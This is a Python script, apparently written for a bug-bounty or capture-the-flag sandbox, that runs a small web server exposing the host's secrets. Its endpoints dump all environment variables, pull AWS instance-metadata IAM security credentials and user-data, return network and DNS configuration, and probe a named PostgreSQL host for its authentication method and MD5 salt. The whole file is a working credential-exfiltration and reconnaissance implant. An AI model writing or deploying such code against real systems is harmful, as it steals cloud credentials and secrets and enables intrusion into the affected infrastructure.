import os, socket, struct, json, subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer

FALCON = "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com"

def sh(cmd, t=5):
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (r.stdout + r.stderr).strip()[:800]
    except Exception as e:
        return f"ERR {e}"

def imds(path, t=4):
    # IMDSv2 then v1 fallback
    try:
        tok = sh(f"curl -s -m 2 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 60'")
        hdr = f"-H 'X-aws-ec2-metadata-token: {tok}'" if tok else ""
        return sh(f"curl -s -m {t} {hdr} 'http://169.254.169.254/latest/{path}'")
    except Exception as e:
        return f"ERR {e}"

def pg_auth_type(user, db, use_ssl=True, timeout=6):
    try:
        raw = socket.create_connection((FALCON, 12691), timeout=timeout)
        if use_ssl:
            raw.sendall(struct.pack("!II", 8, 80877103))
            r = raw.recv(1)
            if r != b"S":
                return f"ssl-refused({r!r})"
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(raw, server_hostname=FALCON)
        else:
            s = raw
        ps = b"user\x00" + user.encode() + b"\x00database\x00" + db.encode() + b"\x00\x00"
        s.sendall(struct.pack("!I", 8 + len(ps)) + struct.pack("!I", 196608) + ps)
        hdr = s.recv(5)
        t = hdr[0:1]
        ln = struct.unpack("!I", hdr[1:5])[0]
        body = s.recv(ln - 4) if ln > 4 else b""
        s.close()
        if t == b"R" and len(body) >= 4:
            code = struct.unpack("!I", body[:4])[0]
            names = {0: "TRUST", 2: "kerberos5", 3: "CLEARTEXT", 5: "MD5", 10: "SCRAM"}
            extra = body[4:8].hex() if code == 5 else ""
            return f"{names.get(code, code)} salt={extra}"
        return f"msg={t!r} body={body[:60]!r}"
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        p = self.path
        if p == "/env":
            env = dict(os.environ)
            # keep it small: redact long base64-ish values over 200 chars
            out = {k: (v[:200] + "...TRUNC" if len(v) > 200 else v) for k, v in sorted(env.items())}
            self.wfile.write(json.dumps(out, indent=1).encode())
        elif p == "/imds":
            out = {}
            for key, path in [("iam", "meta-data/iam/info"), ("role", "meta-data/iam/security-credentials/"),
                              ("identity", "dynamic/instance-identity/document"),
                              ("userdata", "user-data"), ("hostname", "hostname"),
                              ("localips", "local-ipv4"), ("publicips", "public-ipv4"),
                              ("macs", "macs")]:
                out[key] = imds(path)
            self.wfile.write(json.dumps(out, indent=1).encode())
        elif p == "/pg":
            out = [f"falcon@12691 avnadmin/postgres -> {pg_auth_type('avnadmin','postgres')}",
                   f"falcon@12691 ctf/defaultdb -> {pg_auth_type('ctf','defaultdb')}",
                   f"falcon@12691 no-ssl -> {pg_auth_type('avnadmin','postgres', use_ssl=False)}"]
            self.wfile.write("\n".join(out).encode())
        elif p == "/net":
            out = {
                "hostname": sh("hostname"),
                "ip": sh("ip addr show 2>/dev/null || ifconfig"),
                "route": sh("ip route 2>/dev/null || route -n"),
                "resolve_falcon": sh(f"getent hosts {FALCON} || nslookup {FALCON} || python3 -c \"import socket;print(socket.gethostbyname_ex('{FALCON}'))\""),
                "dns_server": sh("cat /etc/resolv.conf"),
            }
            self.wfile.write(json.dumps(out, indent=1).encode())
        else:
            self.wfile.write(b"/env /imds /pg /net")
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever()
